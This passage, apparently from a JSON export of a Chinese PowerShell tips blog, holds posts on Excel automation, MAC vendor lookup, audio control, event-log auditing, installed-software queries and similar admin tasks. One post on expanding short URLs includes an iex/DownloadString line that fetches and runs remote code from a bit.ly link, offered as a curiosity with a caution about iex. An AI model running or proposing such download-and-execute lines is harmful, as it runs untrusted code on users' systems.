cells$workbook.ActiveSheet.Cells.Item(1,1) = 'Hey!'# formatting cell$workbook.ActiveSheet.Cells.Item(1,1).Font.Size = 20$r = 200$g = 100$b = 255[System.Drawing.ColorTranslator]::ToOle([System.Drawing.Color]::FromArgb(255,$r,$g,$b))$workbook.ActiveSheet.Cells.Item(1,1).Font.Color = $r + ($g * 256) + ($b * 256 * 256)# saving workbook to file$Path = &quot;$env:temp\\excel.xlsx&quot;$workbook.SaveAs($Path)","link":"/2017/08/18/creating-excel-reports-part-3-individually-accessing-workbook/"},{"title":"PowerShell 技能连载 - 获取 MAC 制造商列表","text":"Prateek Singh 贡献了一个干净的，CSV 格式的的 MAC 厂商列表。这个列表可以在他的博客 Get-MACVendor using Powershell – Geekeefy 找到。在通过 MAC 地址确定网络设备的厂商时，这个列表十分有用。 您可以用 PowerShell 方便地将它下载到计算机中： 123456789101112131415161718192021222324252627282930313233343536#requires -Version 3.0$url = 'http://goo.gl/VG9XdU'$target = &quot;$home\\Documents\\macvendor.csv&quot;Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $target$content = Import-Csv -Path $target$content | Out-GridViewWith this awesome list, you can now take the first three numbers of any MAC address and find its manufacturer. Here is a simple sample implementation taking the information from Get-NetAdapter, and adding Manufacturer info:#requires -Modules NetAdapter#requires -Version 4.0$url = 'https://raw.githubusercontent.com/PrateekKumarSingh/PowershellScrapy/master/MACManufacturers/MAC_Manufacturer_Reference.csv'$target = &quot;$home\\Documents\\macvendor.csv&quot;$exists = Test-Path -Path $targetif (!$exists){ Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $target}$content = Import-Csv -Path $targetGet-NetAdapter | ForEach-Object { $macString = $_.MacAddress.SubString(0, 8).Replace('-','') $manufacturer = $content. Where{$_.Assignment -like &quot;*$macString*&quot;}. Foreach{$_.ManufacturerName} $_ | Add-Member -MemberType NoteProperty -Name Manufacturer -Value $manufacturer[0] -PassThru | Select-Object -Property Name, Mac*, Manufacturer }","link":"/2017/08/21/getting-mac-vendor-list/"},{"title":"PowerShell 技能连载 - 增强版 Get-History 命令","text":"当您在 PowerShell 中输入 h 命令，您可以看到在这个会话中输入的命令历史。受到 Pratek Singh 的启发 Powershell Get-History+ – Geekeefy，以下是一个灵活的 h+ 命令，它能够在网格界面窗口中显示历史纪录，并且支持选定历史记录。按住 CTRL 键可以选择多个项目。 Pratek 通过 Invoke-Expression 命令执行所有选中的项目。这可能有风险，并且它并不显示命令，所以您不知道执行了什么命令。所以在 h+ 中，我们把选中的项目复制到剪贴板中。这样，您可以将内容粘贴到需要的地方：可以粘贴到文件中，或是将它们粘贴回 PowerShell 来执行。将它们粘贴回 PowerShell 中之后，您还有机会查看这些命令，然后按 ENTER 键执行这些命令。 123456Function h+{ Get-History | Out-GridView -Title &quot;Command History - press CTRL to select multiple - Selected commands copied to clipboard&quot; -OutputMode Multiple | ForEach-Object -Begin { [Text.StringBuilder]$sb = &quot;&quot;} -Process { $null = $sb.AppendLine($_.CommandLine) } -End { $sb.ToString() | clip }} 只需要将 h+ 函数加入您的配置文件脚本中（可以通过 $profile 找到路径）这样它随时可以拿来使用。","link":"/2017/08/22/a-better-get-history/"},{"title":"PowerShell 技能连载 - 控制音量（静音和音量）","text":"Ole Morten Didriksen 发现了一些 API 调用可以启用音量控制 (https://gist.github.com/oledid)。通过这种方法，用 PowerShell 控制音量静音、取消静音、设置音量就很容易了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#requires -Version 2.0Add-Type -TypeDefinition @'using System.Runtime.InteropServices;[Guid(&quot;5CDF2C82-841E-4546-9722-0CF74078229A&quot;), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IAudioEndpointVolume { // f(), g(), ... are unused COM method slots. Define these if you care int f(); int g(); int h(); int i(); int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext); int j(); int GetMasterVolumeLevelScalar(out float pfLevel); int k(); int l(); int m(); int n(); int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext); int GetMute(out bool pbMute);}[Guid(&quot;D666063F-1587-4E43-81F1-B948E807363F&quot;), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice { int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);}[Guid(&quot;A95664D2-9614-4F35-A746-DE8DB63617E6&quot;), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator { int f(); // Unused int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid(&quot;BCDE0395-E52F-467C-8E3D-C4579291692E&quot;)] class MMDeviceEnumeratorComObject { }public class Audio { static IAudioEndpointVolume Vol() { var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator; IMMDevice dev = null; Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev)); IAudioEndpointVolume epv = null; var epvid = typeof(IAudioEndpointVolume).GUID; Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv)); return epv; } public static float Volume { get {float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v;} set {Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty));} } public static bool Mute { get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; } set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); } }}'@# turn audio off[Audio]::Mute = $true# turn audio on[Audio]::Mute = $false# get volumne[Audio]::Volume# set volume (between 0 and 1)[Audio]::Volume = 0.75","link":"/2017/08/23/controlling-audio-mute-and-volume/"},{"title":"PowerShell 技能连载 - 从 WikiQuote 搜集引用","text":"当从 CSV 加载数据到 Excel 中时，我们无法指定格式。 12345PS&gt; Get-QuoteText----If you don't know anything about computers, just remember that they are machines that do exactly w... 12345PS&gt; Get-Quote -Topics menText Author---- ------But man is not made for defeat. A man can be destroyed but not defeated. Ernest Hemingway (1899–1... 12345678PS&gt; Get-Quote -Topics jewelryWARNING: Topic 'jewelry' not found. Try a different one!PS&gt; Get-Quote -Topics jewelText----Cynicism isn't smarter, it's only safer. There's nothing fluffy about optimism . … People have th... 以下脚本首先加载 HTML 内容，然后使用正则表达式来搜集 HTML 中的引用。当然这只适用于原文有规律的情况。wikiquotes 的引用模式是这样的： 1&lt;li&gt;&lt;ul&gt;Quote&lt;ul&gt;&lt;li&gt;Author&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt; 所以以下代码将搜索这个模式，然后清理结构中找到的文本：需要移除 HTML 标签，例如链接，多个空格需要合并为一个空格（通过嵌套函数 Remove-Tag）。 以下是代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function Get-Quote ($Topics='Computer', $Count=1){ function Remove-Tag ($Text) { $tagCount = 0 $text = -join $Text.ToCharArray().Foreach{ switch($_) { '&lt;' { $tagCount++} '&gt;' { $tagCount--; ' '} default { if ($tagCount -eq 0) {$_} } } } $text -replace '\\s{2,}', ' ' } $pattern = &quot;(?im)&lt;li&gt;(.*?)&lt;ul&gt;&lt;li&gt;(.*?)&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&quot; Foreach ($topic in $topics) { $url = &quot;https://en.wikiquote.org/wiki/$Topic&quot; try { $content = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop } catch [System.Net.WebException] { Write-Warning &quot;Topic '$Topic' not found. Try a different one!&quot; return } $html = $content.Content.Replace(&quot;`n&quot;,'').Replace(&quot;`r&quot;,'') [Regex]::Matches($html, $pattern) | ForEach-Object { [PSCustomObject]@{ Text = Remove-Tag $_.Groups[1].Value Author = Remove-Tag $_.Groups[2].Value Topic = $Topic } } | Get-Random -Count $Count }}Get-QuoteGet-Quote -Topic CarGet-Quote -Topic JewelGet-Quote -Topic PowerShell","link":"/2017/08/24/scraping-quotes-from-wikiquote/"},{"title":"PowerShell 技能连载 - 创建一个清单式的摘要对象","text":"从 PowerShell 3 开始，PSCustomObject 可以将从其他地方收集的有用信息方便地合并进来。以下例子从不同的 WMI 类获取各种信息，并且输出为一个清单。该清单可以传递给其它命令，也可以直接使用： 12345678910111213141516171819202122# get information from this computer$Computername = &quot;.&quot;# get basic information (i.e. from WMI)$comp = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $Computername$bios = Get-WmiObject -Class Win32_bios -ComputerName $Computername$os = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computername# combine everything important in one object[PSCustomObject]@{ ComputerName = $Computername Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') Model = $comp.Model Manufacturer = $comp.Manufacturer BIOSVersion = $bios.SMbiosbiosversion BIOSSerialNumber = $bios.serialnumber OSVersion = $os.Version InstallDate = $os.ConvertToDateTime( $os.InstallDate) LastBoot = $os.ConvertToDateTime($os.lastbootuptime) LoggedOnUser = $Comp.UserName}","link":"/2017/08/25/create-summary-objects-for-inventory/"},{"title":"PowerShell 技能连载 - 轻量级 Robocopy","text":"Robocopy.exe 是一个非常有用并且功能多样的内置命令，它可以高效地将文件从一个地方复制到另一个地方。不幸的是，该命令有很多选项和开关，使得它很难掌握。 如果您只是希望将文件从 A 处拷贝到 B 处，以下是将 robocopy 封装并将这个怪兽转化为易用的复制命令的函数： 123456789101112131415function Copy-FileWithRobocopy{ param ( [Parameter(Mandatory)] $Source, [Parameter(Mandatory)] $Destination, $Filter = '*' ) robocopy.exe $Source $Destination $Filter /S /R:0} 以下是如何使用新命令的方法：下面这行代码将所有 .log 文件从 Windows 文件夹复制到 c:\\logs 文件夹： 1PS&gt; Copy-FileWithRobocopy -Source $env:windir -Destination c:\\logs -Filter *.log","link":"/2017/08/28/robocopy-light/"},{"title":"PowerShell 技能连载 - Get-Service 的替代","text":"Get-Service cmdlet 有一系列缺点。例如，没有一个过滤运行中或停止的服务的参数，并且结果不包含服务的启动模式。 WMI 可以传出这些信息。以下是一个获取最常用服务信息的简单函数： 12345678910111213141516function Get-ServiceWithWMI{ param ( $Name = '*', $State = '*', $StartMode = '*' ) Get-WmiObject -Class Win32_Service | Where-Object Name -like $Name | Where-Object State -like $State | Where-Object StartMode -like $StartMode | Select-Object -Property Name, DisplayName, StartMode, State, ProcessId, Description} 以下是调用该命令的方法，这行代码显示所有禁用的服务，包括它们的友好名称和描述： 1PS C:\\&gt; Get-ServiceWithWMI -StartMode Disabled | Out-GridView","link":"/2017/08/29/alternate-get-service/"},{"title":"PowerShell 技能连载 - 禁止 Windows 10 中的 OneDrive","text":"您是否也为任务栏中的 OneDrive 图标感到烦恼？如果您从未使用 OneDrive，以下是两个易于使用的 PowerShell 函数，能够帮助您在资源管理器中隐藏（和显示）OneDrive 图标： 1234567891011121314function Disable-OneDrive{ $regkey1 = 'Registry::HKEY_CLASSES_ROOT\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}' $regkey2 = 'Registry::HKEY_CLASSES_ROOT\\Wow6432Node\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}' Set-ItemProperty -Path $regkey1, $regkey2 -Name System.IsPinnedToNameSpaceTree -Value 0}function Enable-OneDrive{ $regkey1 = 'Registry::HKEY_CLASSES_ROOT\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}' $regkey2 = 'Registry::HKEY_CLASSES_ROOT\\Wow6432Node\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}' Set-ItemProperty -Path $regkey1, $regkey2 -Name System.IsPinnedToNameSpaceTree -Value 1} 执行后不需要重启，结果立即生效。","link":"/2017/08/30/disable-onedrive-in-windows-10/"},{"title":"PowerShell 技能连载 - 查找安装的软件","text":"大多数已安装的文件将自己注册在 Windows 注册表中的四个位置。以下是一个名为 Get-InstalledSoftware 的快速 PowerShell 函数，它能够查询所有这些键名，然后输出找到的软件的信息。 123456789101112131415161718192021222324252627282930313233343536function Get-InstalledSoftware{ param ( $DisplayName='*', $DisplayVersion='*', $UninstallString='*', $InstallDate='*' ) # registry locations where installed software is logged $pathAllUser = &quot;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; $pathCurrentUser = &quot;Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; $pathAllUser32 = &quot;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; $pathCurrentUser32 = &quot;Registry::HKEY_CURRENT_USER\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; # get all values Get-ItemProperty -Path $pathAllUser, $pathCurrentUser, $pathAllUser32, $pathCurrentUser32 | # choose the values to use Select-Object -Property DisplayVersion, DisplayName, UninstallString, InstallDate | # skip all values w/o displayname Where-Object DisplayName -ne $null | # apply user filters submitted via parameter: Where-Object DisplayName -like $DisplayName | Where-Object DisplayVersion -like $DisplayVersion | Where-Object UninstallString -like $UninstallString | Where-Object InstallDate -like $InstallDate | # sort by displayname Sort-Object -Property DisplayName} 这个函数也演示了如何不使用 PowerShell 驱动器而直接使用原生的注册表路径。方法是在路径前面添加 provider 的名称。在这个例子中是 Registry::。 这个函数将所有输出的列（属性）也暴露为参数，所以可以方便地过滤查询结果。以下例子演示了如何查找所有名字包含“Microsoft”的软件： 1234567891011PS C:\\&gt; Get-InstalledSoftware -DisplayName *Microsoft*DisplayVersion DisplayName-------------- ----------- Definition Update for Microsoft Office 2013 (KB3115404) 32-Bit...15.0.4569.1506 Microsoft Access MUI (English) 201315.0.4569.1506 Microsoft Access Setup Metadata MUI (English) 201315.0.4569.1506 Microsoft DCF MUI (English) 201315.0.4569.1506 Microsoft Excel MUI (English) 201315.0.4569.1506 Microsoft Groove MUI (English) 2013(...)","link":"/2017/08/31/find-installed-software/"},{"title":"PowerShell 技能连载 - 注册缺省的 PowerShell 源","text":"如果您使用 PowerShellGet 模块（默认随着 Windows 10 和 Server 2016 分发），您可以方便地下载和安装共享的 PowerShell 脚本和模块： 12345678PS&gt; Find-Module -Tag SecurityVersion Name Repository Description------- ---- ---------- -----------2.5.0 Carbon PSGallery Carbon is a PowerShell module for automating t...0.8.1 ACMESharp PSGallery Client library for the ACME protocol, which is...2.22 DSInternals PSGallery The DSInternals PowerShell Module exposes seve...1.2.0.0 DSCEA PSGallery DSCEA is a scanning engine for processing Test... 不过有些时候，机器上缺失了缺省的 PSGallery 源，要还原缺省设置，请使用以下代码： 1PS&gt; Register-PSRepository -Default","link":"/2017/09/01/registering-default-powershell-repository/"},{"title":"PowerShell 技能连载 - 探索 WMI","text":"如果您知道 WMI 类查询的名字，Get-WmiObject 和 Get-CimInstance 两个命令都可以提供丰富的信息。 以下是一个名为 Explore-WMI 的快速的 PowerShell 函数，它可以帮您查找有用的 WMI 类名： 1234567891011121314151617181920212223242526function Explore-WMI{ # find all WMI classes that start with &quot;Win32_&quot;... $class = Get-WmiObject -Class Win32_* -List | # exclude performance counter classes... Where-Object { $_.Name -notlike 'Win32_Perf*' } | # exclude classes with less than 6 properties... Where-Object { $_.Properties.Count -gt 5 } | # let the user select one of the found classes Out-GridView -Title 'Select one' -OutputMode Single # display selected class name Write-Warning &quot;Klassenname: $($class.Name)&quot; # query class... Get-WmiObject -Class $class.Name | # and show all of its properties Select-Object -Property * # output code $name = $class.name &quot; Get-WmiObject -Class $name | Select-Object -property *&quot; | clip.exe Write-Warning 'Code copied to clipboard. Paste code to try'} 当运行完这段代码后，调用 Explore-WMI 命令，它将会打开一个 grid view 窗口，显示所有以 “Win32_” 开头的 WMI 类，并且不包括性能计数器类，并且暴露至少 6 个属性。您接下来可以选择其中一个。PowerShell 将会显示这个类的实例和它的所有数据，然后将生成这些结果的命令复制到剪贴板。 通过这种方式可以方便有趣地在 WMI 中搜索有用的信息，并且获取得到这些信息的代码。","link":"/2017/09/04/explore-wmi/"},{"title":"PowerShell 技能连载 - 如何正确地封装多个结果","text":"当一个 PowerShell 函数需要返回多用于一种信息时，一定要将它们打包成一个对象。只有通过这种方法，调用者才能够发现和独立存取该信息。以下是一个快速的例子。 这个函数只是输出三段数据。它以一个包含不同对象的数组形式返回： 1234567891011function test{ 33.9 &quot;Hallo&quot; Get-Date}$result = test$result.Count$result 以下是一个更好的函数，能返回相同的信息，但是这些信息被封装为一个结构化的对象。通过这种方法，用户可以容易地读取函数返回的信息： 1234567891011121314151617function test{ [PSCustomObject]@{ Number = 33.9 Text = &quot;Hallo&quot; Date = Get-Date }}$result = test$result.Count$result$result.Number","link":"/2017/09/05/how-to-correctly-wrap-multiple-results/"},{"title":"PowerShell 技能连载 - 查找所有 UAC 提权记录","text":"Windows 的“安全”日志包含了丰富的审计信息。默认情况下，它记录了所有的提权请求。当您以管理员身份运行一个应用程序的时候，就会产生一条记录。 要获取您机器上提权的记录列表，请试试以下代码： 123456789101112131415161718192021222324252627282930313233343536#requires -RunAsAdministratorfunction Get-ElevationInfo{ param ( [DateTime]$Before, [DateTime]$After, [string[]]$ComputerName, $User = '*', $Privileges = '*', $Newest = [Int]::MaxValue ) $null = $PSBoundParameters.Remove('Privileges') $null = $PSBoundParameters.Remove('User') $null = $PSBoundParameters.Remove('Newest') Get-EventLog -LogName Security -InstanceId 4672 @PSBoundParameters | ForEach-Object { [PSCustomObject]@{ Time = $_.TimeGenerated User = $_.ReplacementStrings[1] Domain = $_.ReplacementStrings[2] Privileges = $_.ReplacementStrings[4] } } | Where-Object Path -like $Privileges | Where-Object User -like $User | Select-Object -First $Newest}Get-ElevationInfo -User pshero* -Newest 2 |Out-GridView Get-ElevationInfo 查询 ID 为 4672 的系统日志。安全信息是受保护的，所以只有管理员账户才能执行这段代码。这是为什么这段代码使用 #requires 来防止非管理员执行这段代码的原因。 这个函数也利用了 $PSBoundParameters 哈希表。这个哈希表包含了用户传入的所有参数。只有一部分信息需要传递给 Get-EventLog 命令，所以用于其他参数需要从哈希表中移除。这样，用户可以只传递 Before、After 和 ComputerName 给 Get-EventLog 命令。 接下来，处理事件信息。所有相关的信息都可以在 ReplacementStrings 属性中找到。这个属性是一个数组。正如结果所展示的那样，ID 为 4672 的事件，第二个（下标为 1）元素为用户名，第三个（下标为 2）元素为域名，第五个（下标为 4）列出获取到的安全特权。","link":"/2017/09/06/finding-uac-elevations/"},{"title":"PowerShell 技能连载 - 审计登录事件","text":"您是否想知道当您不在的时候是否有人登录过您的 PC？在前一个技能中我们解释了如何从 Windows 安全日志中解析详细的审计信息，假设您拥有管理员权限。 To find out who logged into your PC, try the code below! The function Get-LogonInfo searches for security events with ID 4624. Security information is protected, so you need to be an Administrator to run this code. This is why the code uses a #requires statement that prevents non-Admins from running the code.要查看谁登录到了您的 PC，请试试以下代码！Get-LogonInfo 函数搜索 ID 为 4624 的安全事件。安全信息是受保护的，所以只有管理员账户才能执行这段代码。这是为什么这段代码使用 #requires 来防止非管理员执行这段代码的原因。 123456789101112131415161718192021222324252627282930313233343536373839404142#requires -RunAsAdministratorfunction Get-LogonInfo{ param ( [Int]$Newest = [Int]::MaxValue, [DateTime]$Before, [DateTime]$After, [string[]]$ComputerName, $Authentication = '*', $User = '*', $Path = '*' ) $null = $PSBoundParameters.Remove('Authentication') $null = $PSBoundParameters.Remove('User') $null = $PSBoundParameters.Remove('Path') $null = $PSBoundParameters.Remove('Newest') Get-EventLog -LogName Security -InstanceId 4624 @PSBoundParameters | ForEach-Object { [PSCustomObject]@{ Time = $_.TimeGenerated User = $_.ReplacementStrings[5] Domain = $_.ReplacementStrings[6] Path = $_.ReplacementStrings[17] Authentication = $_.ReplacementStrings[10] } } | Where-Object Path -like $Path | Where-Object User -like $User | Where-Object Authentication -like $Authentication | Select-Object -First $Newest}$yesterday = (Get-Date).AddDays(-1)Get-LogonInfo -After $yesterday |Out-GridView 这个函数也利用了 $PSBoundParameters 哈希表。这个哈希表包含了用户传入的所有参数。只有一部分信息需要传递给 Get-EventLog 命令，所以用于其他参数需要从哈希表中移除。这样，用户可以只传递 Before、After 和 ComputerName 给 Get-EventLog 命令。 接下来，处理事件信息。所有相关的信息都可以在 ReplacementStrings 属性中找到。这个属性是一个数组。正如结果所展示的那样，ID 为 4624 的事件，第六个（下标为 5）元素为用户名，第七个（下标为 6）元素为域名，第十八个（下标为 17）列出执行登录操作的可执行程序路径。 物理上的登陆通常是由 lass ，即本地安全授权执行的。所以要只查看由人类执行的登录操作，请使用以下代码： 123$yesterday = (Get-Date).AddDays(-1)Get-LogonInfo -After $yesterday -Path *\\lsass.exe |Out-GridView","link":"/2017/09/07/auditing-logons/"},{"title":"PowerShell 技能连载 - 解析完全限定名","text":"完全限定名是字符串的格式，而字符串包含丰富的处理数据方法。最强大而又十分简单的是 Split() 方法。 请看使用 Split() 解析完全限定名，获取最后一个元素的名称，是多么简单： 123$dn = 'CN=pshero010,CN=Users,DC=powershell,DC=local'$lastElement = $dn.Split(',')[0].Split('=')[-1]$lastElement Split() 总是返回一个字符串数组。通过大括号，您可以操作每一个独立的数组元素。所以这段代码首先用逗号分割，然后取出第一个元素，即“CN=pshero010”。然后，再次使用相同的技术，用“=”分割。在这里，我们关心的是最后一个数组元素。PowerShell 支持负的数组下标，它从数组的尾部开始计算，所以下标为 -1 获取的是最后一个数组元素。任务完成！","link":"/2017/09/08/parsing-distinguished-names/"},{"title":"PowerShell 技能连载 - PowerShell.exe 的“大括号秘密”","text":"当从 PowerShell 或 PowerShell Core 中调用 powershell.exe 时有一些小秘密：当您执行 powershell.exe 并通过 -Command 传递一些命令时，PowerShell 将运行这个命令并返回纯文本： 123$a = powershell -noprofile -Command Get-Service$a[0].GetType().FullNameSystem.String 所以当您将代码放在大括号中执行时，PowerShell 会将强类型的结果序列化后返回： 123456789101112131415161718192021$a = powershell -noprofile -Command { Get-Service }$a[0].GetType().FullNameSystem.Management.Automation.PSObject$a[0] | Select-Object -Property *Name : AdobeARMserviceRequiredServices : {}CanPauseAndContinue : FalseCanShutdown : FalseCanStop : TrueDisplayName : Adobe Acrobat Update ServiceDependentServices : {}MachineName : .ServiceName : AdobeARMserviceServicesDependedOn : {}Status : RunningServiceType : Win32OwnProcessStartType : AutomaticSite :Container :","link":"/2017/09/11/braces-secret-with-powershell-exe/"},{"title":"PowerShell 技能连载 - 在 Linux 的 PowerShell Core 中安装模块","text":"当您想通过 PowerShellGet 库为所有用户安装模块，您需要管理员权限。在 Linux 的 PowerShell Core 中，您可以用 sudo 命令来启用管理员权限，并且运行 PowerShell。只需要把命令写在在大括号中即可。 在 Linux 的 PowerShell Core 上，以下命令将为所有用户从 PowerShell Gallery 中安装 AzureRM.NetCore： 1sudo powershell -Command {Install-Module -Name AzureRM.Netcore}","link":"/2017/09/12/installing-modules-in-powershell-core-on-linux/"},{"title":"PowerShell 技能连载 - 记录脚本输出","text":"有一系列办法能记录脚本的输出结果，但是一个非常偷懒的办法是使用 Start-Transcript。在 PowerShell 5 中，这个 cmdlet 不仅在 powershell.exe 中支持，而且在所有宿主中都支持。所以您在 PowerShell ISE 或其它编辑器中都可以使用它。另外，transcript 支持嵌套，所以如果您写一个脚本，您可以安全地在起始处加上 Start-Transcript 并且在结尾处加上 Stop-Transcript。 Start-Transcript 将所有输出输出写入一个文本文件。如果您没有指定路径，那么该 cmdlet 将会使用默认路径。您只需要确保脚本确实产生了可记录的输出。 要使脚本更详细，请结合这个技巧一起使用：当您将赋值语句放入一对括号 ()，该赋值语句也会输出赋值的数据。这个输出结果也会被 transcript 接收到。请试试一下代码： 1234567# default assignment, no output$a = Get-Service$a.Count# assignment in parentheses, outputs the assignment($b = Get-Service)$b.Count","link":"/2017/09/13/logging-script-output/"},{"title":"PowerShell 技能连载 - 同时输出和赋值","text":"在前一个技能中我们介绍了如何记录脚本结果，以及如何使用括号来同时输出和赋值： 1234567891011121314151617PS&gt; ($a = Get-Process -Id $pid)Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1595 102 283200 325444 64,56 6436 1 powershell_isePS&gt; $aHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1595 102 283200 325444 64,75 6436 1 powershell_isePS&gt; 还可以用 -OutVariable 通用参数来实现相同的功能： 1234567891011121314151617PS&gt; Get-Process -Id $pid -OutVariable bHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1731 105 290336 341688 66,66 6436 1 powershell_isePS&gt; $bHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1731 105 290336 341688 66,92 6436 1 powershell_isePS&gt; Tee-Object 是第三种方法： 1234567891011121314151617PS&gt; Get-Process -Id $pid | Tee-Object -Variable cHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1759 109 292300 343644 71,53 6436 1 powershell_isePS&gt; $cHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1759 109 292300 343644 71,69 6436 1 powershell_isePS&gt; 以上方法使用了管道，而管道的速度比较慢。如果希望提升性能，那么避免使用管道： 1234567891011121314151617PS&gt; Tee-Object -InputObject (Get-Process -Id $pid) -Variable dHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1761 111 294568 345268 74,31 6436 1 powershell_isePS&gt; $dHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1761 111 294568 345268 74,59 6436 1 powershell_isePS&gt;","link":"/2017/09/14/outputting-amp-assigning-at-the-same-time/"},{"title":"PowerShell 技能连载 - 使用在线帮助","text":"PowerShell 的发行版并没有带帮助文件，而本地安装帮助文件需要管理员权限。 更简单的获取帮助的方法是访问 cmdlet 的在线帮助，类似这样： 1Get-Help -Name Get-Acl -Online 这将启动一个浏览器并导航到在线帮助。在线帮助通常内容更新并且更容易获得。当然，它需要 internet 连接，并且并不是每个 cmdlet 都有在线帮助版本。","link":"/2017/09/15/using-online-help/"},{"title":"PowerShell 技能连载 - 避免使用 Read-Host","text":"您是否使用 Read-Host 来接受用户的输入？如果您是这么做的，请重新考虑一下。Read-Host 总是提示用户，并且用了 Read-Host 就无法自动化运行脚本： 1$City = Read-Host -Prompt 'Enter City' 一个更好的简单方法是这样： 1234param( [Parameter(Mandatory)]$City) 它创建了一个必选参数。如果用户没有提供传输这个实参，那么会创建一个提示，效果类似 Read-Host。但是，用户始终可以传入这个脚本的参数并使脚本自动化运行。只需要确保只有一个 param() 语句，并且必须放在脚本的开始处。逗号来分隔多个参数。 如果您不喜欢 param() 创建的提示，那么可以用这种方法： 1234param( $City = (Read-Host -Prompt 'Enter City')) 这样，您可以完全控制提示的内容，并且用户又可以通过实参传入参数，并且无人值守运行脚本。","link":"/2017/09/18/avoid-read-host/"},{"title":"PowerShell 技能连载 -获取天气预报","text":"Invoke-WebRequest 可以轻松地获得网页内容。如果不指定 –UseBasicParsing 参数，HTML 内容会被解析成 Internet Explorer DOM。通过这种方法，PowerShell 只需要几行代码就可以获取世界上大多数城市当前的天气预报： 123456$City = 'New York'$weather = Invoke-WebRequest -Uri &quot;http://wttr.in/$City&quot;$text = $weather.ParsedHtml.building.outerText$text$text | Out-GridView 要注意一些事情： Out-GridView 只能显示有限行的文本。要查看完整的报告，请将 $text 输出到控制台。 Invoke-WebRequest 需要内置的 Windows 浏览器运行和初始化至少一次 以上代码是脆弱的：一旦网站作者对页面内容重新布局，脚本可能就不能工作了","link":"/2017/09/19/get-weather-forecast/"},{"title":"PowerShell 技能连载 - 创建彩色的天气报告","text":"在前一个技能中我们介绍了如何用 Invoke-WebRequest 来获取天气预报数据。获取到的数据是纯黑白的文本。 要获取彩色的报告，Windows 10 可以利用 powershell.exe 的控制序列特性。只需要在 PowerShell 控制台中运行以下代码： 123$City = 'Hannover'(Invoke-WebRequest &quot;http://wttr.in/$City&quot; -UserAgent curl).content -split &quot;`n&quot; 只需要将 user agent 设为“curl”，Windows 10 powershell.exe 就能收到包含色彩控制序列的输出。","link":"/2017/09/20/creating-colorful-weather-report/"},{"title":"PowerShell 技能连载 - 还原 TinyUrl 的真实地址","text":"URL 缩短功能对于 Twitter 消息十分有用，但是隐藏了真实地址。您是否真的信任 http://bit.ly/e0Mw9w 呢？ 以下是一个简单的方法，帮您还原缩短后的 URL 指向的真实地址： 123456$shortUrl = &quot;http://bit.ly/e0Mw9w&quot;$longURL = Invoke-WebRequest -Uri &quot;http://untiny.me/api/1.0/extract?url=$shortUrl&amp;format=text&quot; -UseBasicParsing | Select-Object -ExpandProperty Content&quot;'$shortUrl' -&gt; '$longUrl'&quot; 如您所见，这个例子中缩短的 URL 指向的是 Lee Holmes 的博客：http://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1 。Lee Holmes 是一个 PowerShell 团队成员，如果您信任他，那么可以好奇地运行他著名的代码片段： 1iex (New-Object Net.WebClient).DownloadString(&quot;http://bit.ly/e0Mw9w&quot;) 这是一个能说明 Invoke-Expression 别名为“iex”有危险的很好例子。","link":"/2017/09/21/uncovering-tinyurls-true-origin/"},{"title":"PowerShell 技能连载 - 高效统计文件数量（第一部分）","text":"一个快速但浪费的统计文件数量的方法如下： 1(Get-ChildItem -Path c:\\windows).Count 但是，这将产生一些内存负担，因为在 Count 